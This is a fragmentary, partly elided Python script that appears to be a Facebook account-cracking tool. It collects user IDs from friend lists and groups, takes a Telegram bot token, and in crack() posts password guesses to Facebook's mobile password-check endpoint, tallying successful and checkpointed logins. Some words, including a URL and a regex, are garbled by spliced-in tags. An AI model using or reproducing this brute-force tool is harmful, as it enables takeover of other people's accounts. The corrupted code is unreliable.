...
S = '\033[1;33m' #احمر
print('\n')
token=input(B+'تــوكن بـوتك : '+F)
print('\n')
ID=input(B+'ايـــديــك    : '+F)
os.system('clear')
...
class Login:
    ...
    def login_cokie(self):
        ...
        try:
            ...
            if 'href="/zero/optin/write/' in str(link):
                ...
                print("[✘] InvSaifHeder cookie [NO]");time.sleep(2);self.login_cokie()
    ...
    def get_proxy(self):
        rest = []
        self.ses.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36"})
        ...
        if ykh in ["", " "]:
            ...
            if "me" in user:
                try:
                    ...
                    if "Anda Diblokir Sementara" in link:
                        print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan berSaifHederh akun");time.sleep(2);self.menu()
                    else:
            ...
            try:
                ...
                if "Halaman Tidak Ditemukan" in link:
                    ...
                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan ber𝐃𝐄𝐊𝐎h akun");time.sleep(2);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press C on your keyboard.")
            ...
            try:
                ...
                if "Halaman yang Anda minta tidak ditemukan." in link:
                    ...
                    print("[!] facebook membatasi setiap aktivitas, limit bro, silahkan ber𝑓aifHederh akun");time.sleep(2);self.menu()
                elif "Konten Tidak Ditemukan" in link:
                    print(f"[!] pengguna dengan grup id {user} tidak ditemukan");time.sleep(2);self.menu()
                else:
                    print("[!] to stop press CTRL then press C on your keyboard.")
...
def passwrd():
	...
	print('')
	print('>> Lanjut Crack KembSaifHeder ( Y/t ) ? ')
	woi = input('>> Pilih : ')
	if woi in ['y','Y']:
		back()
	else:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s{ [Saif] %s/%s ➙ [OK] %s ➙ [CP] %s .. } %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			po = ses.post('https://m.facebook.com/login/device-based/v𝐃𝐄𝐊𝐎date-password/?shbl=0',data=dataa,allow_redirects=False)
...
@suuid  -  @xisuz					
					...
					try:ttl = re.findall('\<\/td\>\<td\ vSaifHedergn\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
